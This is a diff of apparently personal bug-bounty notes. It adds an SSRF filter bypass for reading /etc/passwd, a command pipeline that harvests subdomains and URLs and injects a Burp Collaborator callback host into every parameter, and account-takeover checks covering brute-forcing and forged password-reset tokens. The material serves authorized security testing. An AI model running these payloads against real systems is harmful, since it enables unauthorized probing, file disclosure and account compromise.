@@ -2048,6 +2048,12 @@ header('Location: http://127.0.0.1:8080/status');
    give to Burp Collaborator/ ngrok  instance to see if it would fetch my instance:
   bruteforce new endpoint and check for paths and directories  
   
+  tip
+  SSRF are ❤️
+
+file:///etc/passwd : Not authorized
+file://\/\/etc/passwd : Work
+  
   tip3 
    
      dig (url)
@@ -2103,7 +2109,19 @@ header('Location: http://127.0.0.1:8080/status');
 
 5️⃣ File Upload - Does your target app support uploading files? 📂 Try uploading an HTML file; if rendered and executed on the server-side, you might strike gold. No luck? Try an SVG with SSRF payload. If that fails, move on to the next!
    
-   
+   SSRF METHODOLOGY BY AaKASH
+   look for subdomian by Amass, Sublist3r and subdomainer
+   check live subdomain
+   cat all-domains.txt | httpx > all-live.txt
+    find all the urls associated with the domains
+    cat all-live.txt | gauplus -subs -b png,jpg,gif,jpeg,swf,woff,gif,svg -o allUrls.txt
+    Injection Burp Collaborator URL in Parameters
+    cat allUrls.txt | grep "=" | qsreplace http://troupga5ke78yjdu4hv12s1v2m8dw3ks.oastify.com > ssrf.txt
+    Test for SSRF Vulnerabilities
+   cat ssrf.txt | httpx -fr
+   If any url vulnerable to SSRF will be show in burp collaborator.
+    
+      
   
    
    
@@ -2162,6 +2180,35 @@ Takeaways: Don't ignore workflows involving payments; you might discover workaro
       
       use httpx to keep track of the code
       cat hosttxt | httpx -title -status-code
+      
+      
+      
+      
+      ACCOUNT TAKEOVER
+      
+   1) Check if weak password can be set
+       if yes, then check for brute-forcing
+    if no rate-limit 0r 429, too many requests response doesnst come within few minutes of bruteforcing, you can raise the report by mention
+    WEAK PASSWORD POLICY WITH NO RATE-LIMIT
+    
+   2) TRY TO SEND TOKEN IN RESET PASSSWORD
+     check on reset password
+     enter your mail id
+     intercept the request
+     add Token Parameter
+     {
+     email: "smaty@gmail.com",
+     Token: "ggsgsgsfaagagagcz vzzvzzczcczczczc"                               any giberish
+     }
+     
+     check if the crafted token is sent or not , if yes report for account takeover
+    
+   
+    3)
+     
+   
+   
+      
       
       
       
@@ -2263,8 +2310,6 @@ ffuf -u https://notes.readcted.com/FUZZ -w ~/wordlists/domino.txt -mc 200 -fw 1
   Always FUZZ based on the technology stack and always dig deep, say you found /admin — 403, then try fuzzing for https://example.com/admin/FUZZ URL to check if any other endpoint accessible without admin login
        
        
-       
-
        
        
 
